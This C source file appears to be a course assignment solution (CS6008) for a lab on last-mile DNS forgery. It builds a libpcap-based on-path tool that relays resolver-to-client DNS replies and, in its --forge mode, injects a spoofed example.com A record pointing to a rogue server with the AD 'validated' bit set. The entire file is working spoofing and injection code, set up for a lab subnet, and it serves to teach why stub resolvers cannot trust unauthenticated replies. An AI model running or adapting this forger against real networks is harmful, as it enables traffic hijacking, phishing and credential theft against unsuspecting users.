/*
 * CS6008 Assignment 2 — Phase 6: Last-Mile Response Forgery
 * ---------------------------------------------------------
 * The resolver validates DNSSEC upstream, but the resolver->client hop carries
 * no proof of it: a stub trusts whatever appears to come from its resolver.
 * This on-path adversary sits on the CLIENT subnet (172.16.1.100). The
 * edge-router diverts client-bound replies (dst 172.16.1.10) to this host; we
 * relay them, except for example.com/A which we replace with a forged answer
 * pointing at rogue-web (172.16.1.30) — with the AD bit set, to show a stub
 * cannot distinguish a "validated" reply from a forged one.
 *
 *   --relay   transparent relay (verification 6.2: client gets the real page)
 *   --forge   forge the example.com/A resolver->client reply
 *
 * The client's MAC is discovered by ARP (same subnet); nothing is hard-coded.
 * C + libpcap only (pcap_sendpacket to inject).
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <time.h>
#include <pcap.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <net/ethernet.h>
#include <net/if_arp.h>
#include <ifaddrs.h>
#include <sys/socket.h>
#include <netpacket/packet.h>

#define MAX_PKT 2048
#define TARGET "example.com"
#define CLIENT_IP "172.16.1.10"
#define ROGUE_IP  "172.16.1.30"
#define T_A 1

typedef enum { MODE_RELAY, MODE_FORGE } amode_t;
static amode_t g_mode = MODE_RELAY;
static pcap_t *handle = NULL;
static char g_dev[64] = "eth0";
static uint8_t g_amac[6], g_cmac[6];
static uint32_t g_aip_n, g_cip_n, g_rogue_n;

static volatile sig_atomic_t run = 1;
static void on_sig(int s){ (void)s; run = 0; if (handle) pcap_breakloop(handle); }

static uint16_t checksum(const void *buf, size_t len){
    uint32_t sum=0; const uint16_t *p=buf;
    while(len>1){sum+=*p++;len-=2;}
    if(len==1) sum+=*(const uint8_t*)p;
    while(sum>>16) sum=(sum&0xFFFF)+(sum>>16);
    return (uint16_t)(~sum);
}
struct pseudo_hdr{uint32_t s,d;uint8_t z,p;uint16_t l;}__attribute__((packed));
static uint16_t udp_checksum(const struct iphdr*ip,const struct udphdr*u,const uint8_t*pl,size_t pll){
    struct pseudo_hdr ph={ip->saddr,ip->daddr,0,IPPROTO_UDP,htons((uint16_t)(sizeof(struct udphdr)+pll))};
    size_t tot=sizeof(ph)+sizeof(struct udphdr)+pll;
    uint8_t*b=calloc(1,tot+1); if(!b) return 0;
    struct udphdr t=*u; t.check=0;
    memcpy(b,&ph,sizeof(ph)); memcpy(b+sizeof(ph),&t,sizeof(t)); memcpy(b+sizeof(ph)+sizeof(t),pl,pll);
    uint16_t r=checksum(b,tot); free(b); return r?r:0xFFFF;
}
static int read_name(const uint8_t*m,size_t ml,size_t off,char*out,size_t os){
    size_t o=0,i=off; int jumped=0,after=-1,guard=0;
    if(out&&os) out[0]='\0';
    while(i<ml){
        if(++guard>128) return -1;
        uint8_t l=m[i];
        if((l&0xC0)==0xC0){ if(i+1>=ml) return -1; if(!jumped) after=(int)(i+2);
            i=((l&0x3F)<<8)|m[i+1]; jumped=1; if(i>=ml) return -1; continue; }
        if(l==0){ if(!jumped) after=(int)(i+1); break; }
        if(l>63||i+1+l>ml) return -1;
        i++;
        for(uint8_t k=0;k<l;k++){ if(out&&o+2<os){ char c=(char)m[i+k]; if(c>='A'&&c<='Z') c=(char)(c-'A'+'a'); out[o++]=c; } }
        if(out&&o+1<os) out[o++]='.';
        i+=l;
    }
    if(out&&os){ if(o&&out[o-1]=='.') o--; out[o]='\0'; }
    return after;
}

/* forged example.com/A answer, AD bit set (claims "validated") */
static int forge_a(const uint8_t*dns,size_t dlen,uint8_t*out){
    if(dlen<12) return -1;
    int e=read_name(dns,dlen,12,NULL,0); if(e<0) return -1;
    size_t qend=(size_t)e+4; if(qend>dlen) return -1;
    out[0]=dns[0]; out[1]=dns[1];
    out[2]=0x81; out[3]=0xA0;          /* QR RD RA AD */
    out[4]=dns[4]; out[5]=dns[5];      /* QDCOUNT */
    out[6]=0; out[7]=1;                /* ANCOUNT 1 */
    out[8]=0; out[9]=0; out[10]=0; out[11]=0;
    size_t ql=qend-12; memcpy(out+12,dns+12,ql); size_t c=12+ql;
    out[c++]=0xC0; out[c++]=0x0C;
    out[c++]=0; out[c++]=T_A;
    out[c++]=0; out[c++]=1;
    out[c++]=0; out[c++]=0; out[c++]=0x01; out[c++]=0x2C;  /* TTL 300 */
    out[c++]=0; out[c++]=4;
    memcpy(out+c,&g_rogue_n,4); c+=4;
    return (int)c;
}

static void send_to_client(struct iphdr*iph,struct udphdr*udph,const uint8_t*dns,size_t dlen){
    uint8_t f[MAX_PKT];
    size_t l2=sizeof(struct ether_header),l3=sizeof(struct iphdr),l4=sizeof(struct udphdr);
    if(l2+l3+l4+dlen>sizeof(f)) return;
    struct ether_header*eth=(struct ether_header*)f;
    memcpy(eth->ether_shost,g_amac,6); memcpy(eth->ether_dhost,g_cmac,6);
    eth->ether_type=htons(ETHERTYPE_IP);
    struct iphdr*o=(struct iphdr*)(f+l2);
    o->ihl=5;o->version=4;o->tos=0;
    o->tot_len=htons((uint16_t)(l3+l4+dlen));
    o->id=iph->id;o->frag_off=0;o->ttl=64;o->protocol=IPPROTO_UDP;
    o->saddr=iph->saddr;      /* keep resolver as source */
    o->daddr=iph->daddr;      /* client */
    o->check=0; o->check=checksum(o,l3);
    struct udphdr*ou=(struct udphdr*)(f+l2+l3);
    ou->source=udph->source; ou->dest=udph->dest;
    ou->len=htons((uint16_t)(l4+dlen)); ou->check=0;
    ou->check=udp_checksum(o,ou,dns,dlen);
    memcpy(f+l2+l3+l4,dns,dlen);
    pcap_sendpacket(handle,f,l2+l3+l4+dlen);
}

static void handler(u_char*user,const struct pcap_pkthdr*h,const u_char*pkt){
    (void)user;
    size_t min=sizeof(struct ether_header)+sizeof(struct iphdr)+sizeof(struct udphdr)+12;
    if(h->caplen<min) return;
    struct ether_header*eth=(struct ether_header*)pkt;
    if(ntohs(eth->ether_type)!=ETHERTYPE_IP) return;
    if(memcmp(eth->ether_shost,g_amac,6)==0) return;   /* ignore our own frames */
    struct iphdr*iph=(struct iphdr*)(pkt+sizeof(struct ether_header));
    if(iph->protocol!=IPPROTO_UDP) return;
    size_t ihl=iph->ihl*4;
    struct udphdr*udph=(struct udphdr*)((uint8_t*)iph+ihl);
    if(iph->daddr!=g_cip_n || ntohs(udph->source)!=53) return;  /* resolver->client replies */
    const uint8_t*dns=(const uint8_t*)udph+sizeof(struct udphdr);
    size_t ulen=ntohs(udph->len);
    if(ulen<sizeof(struct udphdr)+12) return;
    size_t dlen=ulen-sizeof(struct udphdr);
    if(dns+dlen>pkt+h->caplen) return;

    uint16_t flags=(dns[2]<<8)|dns[3];
    int is_resp=(flags&0x8000)!=0;
    uint16_t qd=(dns[4]<<8)|dns[5];
    uint16_t an=(dns[6]<<8)|dns[7];
    char qname[256]={0}; uint16_t qtype=0;
    if(qd>0){ int e=read_name(dns,dlen,12,qname,sizeof(qname)); if(e>=0&&(size_t)e+4<=dlen) qtype=(dns[e]<<8)|dns[e+1]; }

    if(g_mode==MODE_FORGE && is_resp && strcasecmp(qname,TARGET)==0 && qtype==T_A && an>=1){
        uint8_t fdns[512]; int fl=forge_a(dns,dlen,fdns);
        if(fl>0){
            printf("[FORGE] resolver->client example.com A (id 0x%02x%02x) -> %s (AD set)\n",dns[0],dns[1],ROGUE_IP);
            fflush(stdout);
            send_to_client(iph,udph,fdns,(size_t)fl);
            return;
        }
    }
    /* transparent relay */
    uint8_t buf[MAX_PKT];
    if(h->caplen>sizeof(buf)) return;
    memcpy(buf,pkt,h->caplen);
    struct ether_header*re=(struct ether_header*)buf;
    memcpy(re->ether_shost,g_amac,6); memcpy(re->ether_dhost,g_cmac,6);
    struct iphdr*ri=(struct iphdr*)(buf+sizeof(struct ether_header));
    struct udphdr*ru=(struct udphdr*)((uint8_t*)ri+ihl);
    const uint8_t*rd=(const uint8_t*)ru+sizeof(struct udphdr);
    ri->check=0; ri->check=checksum(ri,ihl);
    ru->check=0; ru->check=udp_checksum(ri,ru,rd,dlen);
    pcap_sendpacket(handle,buf,h->caplen);
}

struct arp_pkt{struct ether_header eth;uint16_t ht,pt;uint8_t hl,pl;uint16_t op;uint8_t sha[6],spa[4],tha[6],tpa[4];}__attribute__((packed));
static int arp_resolve(uint32_t target,uint8_t*out){
    for(int a=0;a<20&&run;a++){
        struct arp_pkt q; memset(&q,0,sizeof(q));
        memset(q.eth.ether_dhost,0xFF,6); memcpy(q.eth.ether_shost,g_amac,6);
        q.eth.ether_type=htons(ETHERTYPE_ARP);
        q.ht=htons(ARPHRD_ETHER);q.pt=htons(ETHERTYPE_IP);q.hl=6;q.pl=4;q.op=htons(ARPOP_REQUEST);
        memcpy(q.sha,g_amac,6);memcpy(q.spa,&g_aip_n,4);memcpy(q.tpa,&target,4);
        pcap_sendpacket(handle,(const u_char*)&q,sizeof(q));
        time_t s=time(NULL);
        while(time(NULL)-s<1&&run){
            struct pcap_pkthdr*h; const u_char*p;
            if(pcap_next_ex(handle,&h,&p)!=1) continue;
            if(h->caplen<sizeof(struct arp_pkt)) continue;
            const struct arp_pkt*r=(const struct arp_pkt*)p;
            if(ntohs(r->eth.ether_type)!=ETHERTYPE_ARP) continue;
            if(ntohs(r->op)!=ARPOP_REPLY) continue;
            if(memcmp(r->spa,&target,4)!=0) continue;
            memcpy(out,r->sha,6); return 0;
        }
    }
    return -1;
}
static int load_local(void){
    struct ifaddrs*ifap,*ifa; int ip=0,mac=0;
    if(getifaddrs(&ifap)) return -1;
    for(ifa=ifap;ifa;ifa=ifa->ifa_next){
        if(!ifa->ifa_addr||strcmp(ifa->ifa_name,g_dev)) continue;
        if(ifa->ifa_addr->sa_family==AF_INET) g_aip_n=((struct sockaddr_in*)ifa->ifa_addr)->sin_addr.s_addr,ip=1;
        else if(ifa->ifa_addr->sa_family==AF_PACKET){ struct sockaddr_ll*ll=(struct sockaddr_ll*)ifa->ifa_addr; if(ll->sll_halen==6){memcpy(g_amac,ll->sll_addr,6);mac=1;} }
    }
    freeifaddrs(ifap);
    return (ip&&mac)?0:-1;
}

int main(int argc,char**argv){
    const char*m=NULL;
    for(int i=1;i<argc;i++){
        if(!strcmp(argv[i],"--relay")){g_mode=MODE_RELAY;m=argv[i];}
        else if(!strcmp(argv[i],"--forge")){g_mode=MODE_FORGE;m=argv[i];}
        else if(!strcmp(argv[i],"-i")&&i+1<argc) strncpy(g_dev,argv[++i],sizeof(g_dev)-1);
    }
    if(!m){ fprintf(stderr,"Usage: %s [--relay|--forge] [-i iface]\n",argv[0]); return 2; }
    inet_pton(AF_INET,CLIENT_IP,&g_cip_n);
    inet_pton(AF_INET,ROGUE_IP,&g_rogue_n);
    if(load_local()){ fprintf(stderr,"cannot read %s addr/mac\n",g_dev); return 1; }
    signal(SIGINT,on_sig); signal(SIGTERM,on_sig);
    char eb[PCAP_ERRBUF_SIZE];
    handle=pcap_open_live(g_dev,MAX_PKT,1,10,eb);
    if(!handle){ fprintf(stderr,"pcap_open_live: %s\n",eb); return 1; }
    if(arp_resolve(g_cip_n,g_cmac)){ fprintf(stderr,"ARP of %s failed; is the route diverted?\n",CLIENT_IP); return 1; }
    printf("forge: mode=%s dev=%s client %s at %02x:%02x:%02x:%02x:%02x:%02x\n",m,g_dev,CLIENT_IP,
           g_cmac[0],g_cmac[1],g_cmac[2],g_cmac[3],g_cmac[4],g_cmac[5]);
    fflush(stdout);
    struct bpf_program fp;
    if(pcap_compile(handle,&fp,"udp and src port 53 and dst host " CLIENT_IP,1,PCAP_NETMASK_UNKNOWN)==-1){
        fprintf(stderr,"bpf: %s\n",pcap_geterr(handle)); return 1;
    }
    pcap_setfilter(handle,&fp);
    printf("forge: running\n"); fflush(stdout);
    pcap_loop(handle,-1,handler,NULL);
    pcap_freecode(&fp); pcap_close(handle);
    return 0;
}
